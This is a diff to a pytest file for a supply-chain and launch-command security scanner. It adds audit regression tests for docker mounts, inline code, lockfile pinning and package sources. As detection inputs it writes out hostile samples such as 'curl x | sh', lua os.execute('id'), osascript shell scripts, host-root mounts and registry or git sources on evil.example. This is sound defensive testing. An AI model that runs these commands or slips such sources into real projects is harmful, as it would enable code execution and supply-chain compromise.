@@ -9,6 +9,7 @@ from __future__ import annotations
 import json
 import os
 from pathlib import Path
+from typing import Any
 
 import pytest
 
@@ -19,6 +20,7 @@ from nexus_symbiote.sbom_import import (
 )
 from nexus_symbiote.scanners.mcp_launch import analyze, known_executable
 from nexus_symbiote.scanners.registry import RegistryScanner
+from tests.support import scaling_ratio
 
 
 def _write(root: Path, rel: str, content: str) -> Path:
@@ -26,6 +28,20 @@ def _write(root: Path, rel: str, content: str) -> Path:
     path.parent.mkdir(parents=True, exist_ok=True)
     path.write_text(content, encoding="utf-8")
     return path
+
+
+def _flow_depth_exceeded(text: str) -> bool:
+    """Scan with the bounded loader: True for the depth refusal, False for a parse error."""
+    import yaml
+
+    try:
+        for _ in yaml.scan(text, Loader=RegistryScanner._bounded_yaml_loader()):
+            pass
+    except ValueError:
+        return True
+    except yaml.YAMLError:
+        return False
+    return False
 
 
 # ---------------------------------------------------------------------------
@@ -319,10 +335,10 @@ def test_r_med_14_registry_yaml_flow_depth_fast_reject(tmp_path: Path) -> None:
         "a'b: " + "[" * 70 + "]" * 70,
         "a#b: " + "[" * 70 + "]" * 70,
     ):
-        assert RegistryScanner._yaml_flow_depth_exceeded(payload) is True
-    assert RegistryScanner._yaml_flow_depth_exceeded("key: # " + "[" * 70 + "]" * 70) is False
-    assert RegistryScanner._yaml_flow_depth_exceeded("k: 'a''b" + "[" * 70 + "'\n") is False
-    assert RegistryScanner._yaml_flow_depth_exceeded('k: "a\\"b' + "[" * 70 + '"\n') is False
+        assert _flow_depth_exceeded(payload) is True
+    assert _flow_depth_exceeded("key: # " + "[" * 70 + "]" * 70) is False
+    assert _flow_depth_exceeded("k: 'a''b" + "[" * 70 + "'\n") is False
+    assert _flow_depth_exceeded('k: "a\\"b' + "[" * 70 + '"\n') is False
 
 
 # ---------------------------------------------------------------------------
@@ -471,3 +487,386 @@ def test_muse_e_332_1_2_3_cargo_and_conda_fixes(tmp_path: Path) -> None:
     parsed = _conda_requirement("1.2.3=py311_0")
     assert parsed is not None
     assert parsed[1] is True
+
+
+# ---------------------------------------------------------------------------
+# Follow-up audit of Bundle F1 (claims A-I): regressions and open findings
+# ---------------------------------------------------------------------------
+
+IMAGE = "alpine@sha256:" + "a" * 64
+GIT_SOURCE = "git+https://evil.example/openai.git#main"
+INTEGRITY = "sha512-" + "A" * 86 + "=="
+CRATES_IO = 'source = "registry+https://github.com/rust-lang/crates.io-index"\n'
+CANDLE_RECORDS = (
+    '[[package]]\nname = "candle-core"\nversion = "0.8.1"\n'
+    + CRATES_IO
+    + '[[package]]\nname = "candle-core"\nversion = "0.8.2"\n'
+    + CRATES_IO
+)
+YARN_LOCK = (
+    "# yarn lockfile v1\n\nopenai@4.0.0:\n"
+    '  version "4.0.0"\n'
+    '  resolved "https://registry.yarnpkg.com/openai/-/openai-4.0.0.tgz"\n'
+    f"  integrity {INTEGRITY}\n"
+)
+
+
+def _mount(*args: str) -> tuple[str | None, set[str]]:
+    res = analyze("docker", ["run", *args, IMAGE])
+    flags = ("host_root_mount", "broad_host_mount", "runtime_socket_mount")
+    return res.unknown, {flag for flag in flags if res.context.get(flag)}
+
+
+def _pnpm_lock(section: str, spec: str) -> str:
+    return (
+        "lockfileVersion: '9.0'\nimporters:\n  .:\n"
+        f"    {section}:\n      openai:\n        specifier: {spec}\n        version: 4.0.0\n"
+        f"packages:\n  openai@4.0.0:\n    resolution: {{integrity: {INTEGRITY}, "
+        "tarball: https://registry.npmjs.org/openai/-/openai-4.0.0.tgz}\n"
+        "snapshots:\n  openai@4.0.0: {}\n"
+    )
+
+
+def _cargo_project(root: Path, dependencies: str, packages: str) -> list[Any]:
+    _write(
+        root, "sub/Cargo.toml", '[package]\nname = "worker"\n[dependencies]\ncandle-core = "0.8"\n'
+    )
+    _write(
+        root,
+        "sub/Cargo.lock",
+        f'[[package]]\nname = "worker"\ndependencies = [{dependencies}]\n' + packages,
+    )
+    comps, failures = walk_nested_manifests(root)
+    assert not failures
+    return comps
+
+
+def _nested_npm_state(
+    root: Path, *, record: dict[str, Any] | None = None, manifest: dict[str, Any] | None = None
+) -> str:
+    manifest = manifest or {"dependencies": {"openai": "^4.0.0"}}
+    record = record or {"version": "4.8.2"}
+    _write(root, "sub/package.json", json.dumps(manifest))
+    lock = {"lockfileVersion": 3, "packages": {"": manifest, "node_modules/openai": record}}
+    _write(root, "sub/package-lock.json", json.dumps(lock))
+    comps, _ = walk_nested_manifests(root)
+    (comp,) = comps
+    state = comp.properties["pinning_state"]
+    assert isinstance(state, str)
+    return state
+
+
+@pytest.mark.parametrize(
+    ("volume", "flags"),
+    [
+        ("${workspaceFolder}/:/w", set()),
+        ("${workspaceFolder}/etc:/w", set()),
+        ("${workspaceFolder}/run:/w", set()),
+        ("${workspaceRoot}/:/w", set()),
+        ("${PWD}/:/w", set()),
+        ("${HOME}/:/w", {"broad_host_mount"}),
+        ("${workspaceFolder}/../:/w", {"broad_host_mount"}),
+        # An environment variable that may be unset still reads as the host root.
+        ("${EMPTY}/:/w", {"host_root_mount"}),
+        ("${X-/}:/w", {"host_root_mount"}),
+    ],
+)
+def test_audit_a_directory_variables_never_expand_to_the_host_root(
+    volume: str, flags: set[str]
+) -> None:
+    unknown, found = _mount("-v", volume)
+    assert unknown is None
+    assert found == flags
+
+
+@pytest.mark.parametrize(
+    "text", ["]" * 2000 + "[" * 2000 + "\n", "}" * 2000 + "{" * 2000 + "\n", "]\n"]
+)
+def test_audit_b_flow_end_outside_a_collection_is_refused(tmp_path: Path, text: str) -> None:
+    import yaml
+
+    with pytest.raises(yaml.YAMLError):
+        for _ in yaml.scan(text, Loader=RegistryScanner._bounded_yaml_loader()):
+            pass
+    _write(tmp_path, "package.json", json.dumps({"dependencies": {"openai": "^4.0.0"}}))
+    _write(tmp_path, "pnpm-lock.yaml", text)
+    res = RegistryScanner().scan(tmp_path)
+    assert any("pnpm-lock.yaml" in failure for failure in res.scan_failures)
+
+
+def test_audit_b_flow_end_runs_do_not_restore_the_quadratic_scan(tmp_path: Path) -> None:
+    roots: dict[int, Path] = {}
+    for scale in (1, 4):
+        root = roots[scale] = tmp_path / str(scale)
+        _write(root, "package.json", json.dumps({"dependencies": {"openai": "^4.0.0"}}))
+        _write(root, "pnpm-lock.yaml", "]" * (500 * scale) + "[" * (500 * scale) + "\n")
+    assert scaling_ratio(lambda scale: RegistryScanner().scan(roots[scale])) < 10
+
+
+def test_audit_b_no_dead_depth_guard_remains() -> None:
+    assert not hasattr(RegistryScanner, "_yaml_flow_depth_exceeded")
+
+
+@pytest.mark.parametrize(
+    "mount",
+    [
+        "type=${X:=bind},source=/,target=/host",
+        "type=${X},source=/,target=/host",
+        "type=${X:-bind},source=/,target=/host",
+        "type=bind,${X:=source}=/,target=/host",
+    ],
+)
+def test_audit_c_mount_type_or_field_substitution_is_unresolved(mount: str) -> None:
+    unknown, _ = _mount("--mount", mount)
+    assert unknown is not None and "unresolved" in unknown
+
+
+def test_audit_c_unset_only_default_keeps_an_empty_value() -> None:
+    # ${X-benign} keeps X when it is set, even to ""; only ${X:-benign} replaces "".
+    unknown, flags = _mount("-v", "/${X-benign}:/host")
+    assert unknown is None
+    assert "host_root_mount" in flags
+    unknown, flags = _mount("-v", "/${X:-benign}:/host")
+    assert unknown is None
+    assert "host_root_mount" not in flags
+
+
+@pytest.mark.parametrize(
+    ("manifest", "lock_name", "lock_text"),
+    [
+        (
+            {"optionalDependencies": {"openai": "4.0.0"}, "dependencies": {"openai": GIT_SOURCE}},
+            "pnpm-lock.yaml",
+            _pnpm_lock("optionalDependencies", "4.0.0"),
+        ),
+        (
+            {
+                "optionalDependencies": {"openai": "4.0.0"},
+                "dependencies": {"openai": "npm:evil@1.0.0"},
+            },
+            "pnpm-lock.yaml",
+            _pnpm_lock("optionalDependencies", "4.0.0"),
+        ),
+        (
+            {"peerDependencies": {"openai": GIT_SOURCE}, "dependencies": {"openai": "4.0.0"}},
+            "yarn.lock",
+            YARN_LOCK,
+        ),
+        (
+            {"peerDependencies": {"openai": "npm:evil@1.0.0"}, "dependencies": {"openai": "4.0.0"}},
+            "yarn.lock",
+            YARN_LOCK,
+        ),
+    ],
+)
+def test_audit_d_conflicting_sections_bind_no_pnpm_or_yarn_record(
+    tmp_path: Path, manifest: dict[str, Any], lock_name: str, lock_text: str
+) -> None:
+    _write(tmp_path, "package.json", json.dumps(manifest))
+    _write(tmp_path, lock_name, lock_text)
+    res = RegistryScanner().scan(tmp_path)
+    (comp,) = [c for c in res.components if c.name == "openai"]
+    assert comp.package_url is None
+    assert "package_resolution" not in comp.claims
+    assert comp.properties["collection_mode"] == "manifest-reference"
+    assert any("conflicting dependency sources" in gap for gap in res.surfaces_excluded)
+
+
+@pytest.mark.parametrize(
+    ("lock_name", "lock_text"),
+    [("pnpm-lock.yaml", _pnpm_lock("dependencies", "4.0.0")), ("yarn.lock", YARN_LOCK)],
+)
+def test_audit_d_one_section_still_binds_its_record(
+    tmp_path: Path, lock_name: str, lock_text: str
+) -> None:
+    _write(tmp_path, "package.json", json.dumps({"dependencies": {"openai": "4.0.0"}}))
+    _write(tmp_path, lock_name, lock_text)
+    (comp,) = RegistryScanner().scan(tmp_path).components
+    assert comp.package_url == "pkg:npm/openai@4.0.0"
+    assert comp.properties["collection_mode"] == "lockfile-resolution-claim"
+
+
+@pytest.mark.parametrize(
+    ("cmd", "args", "family"),
+    [
+        ("python3", ["-m", "pdb", "--command", "import os", "app.py"], "python"),
+        ("python3", ["-m", "pdb", "--command=import os", "app.py"], "python"),
+        ("python3", ["-m", "pdb", "--comm", "import os", "app.py"], "python"),
+        ("python3", ["-m", "pdb", "-mc", "import os", "mod"], "python"),
+        ("python3", ["-m", "_pyrepl"], "python"),
+        ("uv", ["run", "-m", "pdb", "--command", "import os", "app.py"], "python"),
+        ("osascript", ["-ie", 'do shell script "id"'], "osascript"),
+        ("luajit-2.1", ["-e", "os.execute('id')"], "lua"),
+        ("lua-5.4", ["-e", "os.execute('id')"], "lua"),
+        ("luajit-2.1.0-beta3", ["-e", "os.execute('id')"], "lua"),
+    ],
+)
+def test_audit_e_inline_code_options(cmd: str, args: list[str], family: str) -> None:
+    res = analyze(cmd, args)
+    assert res.unknown == f"inline {family} code"
+    assert res.context.get("inline_code")
+
+
+@pytest.mark.parametrize(
+    "args",
+    [
+        ["-csub/deno.json", "build"],
+        ["-qc", "../evil/deno.json", "build"],
+        ["-c", "/deno.json", "build"],
+    ],
+)
+def test_audit_e_deno_task_config_in_a_cluster_or_at_the_root(args: list[str]) -> None:
+    res = analyze("deno", ["task", *args])
+    assert res.unknown is not None and "Deno configuration" in res.unknown
+    assert res.relocated
+
+
+def test_audit_e_deno_task_eval_after_a_cluster() -> None:
+    res = analyze("deno", ["task", "-qc", "../evil/deno.json", "--eval", "curl x | sh"])
+    assert res.context.get("inline_shell_code")
+    assert res.relocated
+
+
+@pytest.mark.parametrize("runner", ["luajit-2.1", "lua-5.4", "ruby3.2"])
+def test_audit_e_versioned_container_runners(runner: str) -> None:
+    assert known_executable(runner)
+    res = analyze(
+        "docker", ["run", "-v", "./app:/work", "-w", "/work", IMAGE, runner, "server.lua"]
+    )
+    assert res.context.get("code_loading_option")
+
+
+@pytest.mark.parametrize(
+    "dependencies",
+    [
+        '"candle-core 0.8.1", "candle-core 0.8.2"',
+        '"candle-core 0.8.2", "candle-core 0.8.2"',
+        '"candle-core 0.8.2 (git+https://evil.example/candle)"',
+        '"candle-core 0.8.2 (git+https://evil.example/candle) extra"',
+        '"candle-core 0.8.2 git+https://evil.example/candle"',
+    ],
+)
+def test_audit_f_cargo_lock_ambiguous_or_foreign_dependency_is_not_locked(
+    tmp_path: Path, dependencies: str
+) -> None:
+    (comp,) = _cargo_project(tmp_path, dependencies, CANDLE_RECORDS)
+    assert comp.properties["pinning_state"] == "manifest-only"
+    assert comp.version == "0.8"
+
+
+def test_audit_f_cargo_lock_source_qualifier_still_locks_the_crates_io_record(
+    tmp_path: Path,
+) -> None:
+    qualified = '"candle-core 0.8.2 (registry+https://github.com/rust-lang/crates.io-index)"'
+    (comp,) = _cargo_project(tmp_path, qualified, CANDLE_RECORDS)
+    assert comp.properties["pinning_state"] == "locked"
+    assert comp.version == "0.8.2"
+
+
+@pytest.mark.parametrize(
+    "selector", ["pnpm-workspace.yaml", "pnpm-lock.yaml", "yarn.lock", "bun.lock", "bun.lockb"]
+)
+def test_audit_g_enclosing_package_manager_files_select_another_lock(
+    tmp_path: Path, selector: str
+) -> None:
+    _write(tmp_path, selector, "")
+    assert _nested_npm_state(tmp_path) == "manifest-only"
+
+
+def test_audit_g_bundled_record_is_not_a_registry_artifact(tmp_path: Path) -> None:
+    assert _nested_npm_state(tmp_path / "plain") == "locked"
+    bundled = {"version": "4.8.2", "bundled": True}
+    assert _nested_npm_state(tmp_path / "bundled", record=bundled) == "manifest-only"
+
+
+def test_audit_g_unreadable_npmrc_symlink_withholds_the_nested_lock(tmp_path: Path) -> None:
+    (tmp_path / "sub").mkdir()
+    os.symlink("/etc/hostname", tmp_path / "sub" / ".npmrc")
+    assert _nested_npm_state(tmp_path) == "manifest-only"
+
+
+def test_audit_h_every_section_reports_its_alias_source_and_override(tmp_path: Path) -> None:
+    # A second alias target is reported beside the one npm installs.
+    aliases = tmp_path / "aliases"
+    _write(
+        aliases,
+        "package.json",
+        json.dumps(
+            {
+                "dependencies": {"helper": "npm:openai@4.0.0"},
+                "devDependencies": {"helper": "npm:other-ai@1.0.0"},
+            }
+        ),
+    )
+    (comp,) = RegistryScanner().scan(aliases).components
+    aliased = [r.detail for r in comp.risks if r.category == "package_alias"]
+    assert any("'openai'" in detail for detail in aliased)
+    assert any("'other-ai'" in detail for detail in aliased)
+
+    # A registry spec in another section resolves through the project's .npmrc.
+    redirected = tmp_path / "redirected"
+    _write(
+        redirected,
+        "package.json",
+        json.dumps(
+            {"dependencies": {"openai": "4.0.0"}, "devDependencies": {"openai": GIT_SOURCE}}
+        ),
+    )
+    _write(redirected, ".npmrc", "registry=https://evil.example/\n")
+    (comp,) = RegistryScanner().scan(redirected).components
+    assert {r.category for r in comp.risks} >= {"nonregistry_source", "registry_origin"}
+
+    # Two git specs that read the same raise one finding, not two.
+    twice = tmp_path / "twice"
+    _write(
+        twice,
+        "package.json",
+        json.dumps(
+            {
+                "dependencies": {"openai": GIT_SOURCE},
+                "devDependencies": {"openai": "git+https://evil.example/openai.git#dev"},
+            }
+        ),
+    )
+    (comp,) = RegistryScanner().scan(twice).components
+    assert len([r for r in comp.risks if r.category == "nonregistry_source"]) == 1
+
+    # An override of the package another section's alias installs is a gap.
+    overridden = tmp_path / "overridden"
+    _write(
+        overridden,
+        "package.json",
+        json.dumps(
+            {
+                "dependencies": {"helper": "npm:openai@4.0.0"},
+                "devDependencies": {"helper": "1.0.0"},
+                "overrides": {"openai": "3.0.0"},
+            }
+        ),
+    )
+    res = RegistryScanner().scan(overridden)
+    assert any("override" in gap for gap in res.surfaces_excluded)
+
+
+@pytest.mark.parametrize(
+    "args", [["-m", "pdb", "app.py", "-cfg"], ["-m", "pdb", "app.py", "-c", "x"]]
+)
+def test_audit_i_pdb_options_end_at_the_script(args: list[str]) -> None:
+    res = analyze("python3", args)
+    assert res.unknown is None
+    assert not res.context.get("inline_code")
+
+
+@pytest.mark.parametrize(
+    "volume", ["/app:/container/${X:=foo}", "/app:/${X:=foo}", "/app:/c:${X:=ro}"]
+)
+def test_audit_i_container_path_substitution_is_not_a_host_source(volume: str) -> None:
+    unknown, flags = _mount("-v", volume)
+    assert unknown is None
+    assert not flags
+
+
+def test_audit_i_uv_with_packages_survive_an_inline_failure() -> None:
+    res = analyze("uv", ["run", "--with", "evil-pkg", "-m", "timeit", "import os"])
+    assert res.unknown == "inline python code"
+    assert [package.name for package in res.packages] == ["evil-pkg"]
